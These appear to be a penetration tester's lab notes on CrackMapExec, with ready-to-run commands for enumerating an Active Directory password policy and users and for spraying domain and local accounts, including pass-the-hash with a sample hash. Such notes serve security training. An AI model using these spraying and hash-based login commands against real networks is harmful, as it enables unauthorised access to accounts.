-- -
Can be used outside of an AD context but generally used in an AD context. 
#### Enumerating AD Password Policy
Requires you have valid credentials first.
```bash
crackmapexec smb <ip> -u <user> -p <passwd> --pass-pol
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

^016942

#### Enumerating valid domain users w/o credentials
```bash
crackmapexec smb <dc ip> --users
crackmapexec smb 172.16.5.5 --users
```

^99029f

#### Password Spray
###### AD Domain Password spray
Password spray domain accounts
```bash
# Use grep to filter out only successful attempts
# generic domain spray
sudo crackmapexec smb <dc ip> -u <userlist> -p <passwd> | grep +

# specific domain spray
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# verify found credentials example:
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

^4d0ec2

###### Local account password spray
Password spray local accounts on the systems in the CIDR range. Local accounts **not** domain accounts. 
```bash
# Note: This method is LOUD, so don't use if you need to be evasive
# generic w/ hash
sudo crackmapexec smb --local-auth <cidr range> -u <username> -H <passwd hash> | grep +

#generic w/ password
sudo crackmapexec smb --local-auth <cidr range> -u <username> -p <passwd> | grep +

# specific w/ hash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

^cc2b19
